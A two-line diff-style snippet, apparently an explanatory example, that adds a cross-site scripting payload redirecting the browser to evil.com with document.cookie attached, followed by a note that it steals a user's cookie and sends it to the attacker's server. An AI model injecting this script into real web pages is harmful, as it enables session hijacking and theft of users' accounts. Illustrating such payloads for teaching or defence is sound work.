@@ -1,0 +1,2 @@
+<script>window.location="http://evil.com/?cookie=" + document.cookie</script> 
+(this script will steal a user's cookie and send it to the attacker's server)
